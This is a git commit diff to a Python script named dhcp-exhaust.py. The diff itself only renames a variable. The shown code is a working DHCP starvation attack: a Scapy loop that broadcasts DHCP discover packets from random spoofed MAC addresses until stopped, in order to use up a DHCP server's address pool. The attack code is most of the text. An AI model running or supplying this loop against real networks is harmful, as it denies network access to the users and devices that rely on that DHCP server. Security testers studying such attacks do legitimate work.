344ac3c446968e848d6749f239cfa7dc75ebee31
Jean-Luc Dupont <103344686+jeanlucdupont@users.noreply.github.com>
2025-08-08 18:51:41 -0500

    Update dhcp-exhaust.py

--- dhcp-exhaust.py
+++ dhcp-exhaust.py
@@ -9,11 +9,10 @@ print("Starting DHCP exhaustion...\nCTRL+C to stop.")
 try:
     while 42:
         mac             = f_macgenerator()
-        dhcp_discover   = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255")  / UDP(sport=68, dport=67) / BOOTP(chaddr=RandMAC()) / DHCP(options=[("message-type", "discover"), "end"])
-        sendp(dhcp_discover, verbose=False)
+        dhcpdiscover    = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255")  / UDP(sport=68, dport=67) / BOOTP(chaddr=RandMAC()) / DHCP(options=[("message-type", "discover"), "end"])
+        sendp(dhcpdiscover, verbose=False)
         print(f"MAC: {mac}")
         time.sleep(0.2) 
-
 except KeyboardInterrupt:
     print("\nStopped.")
     
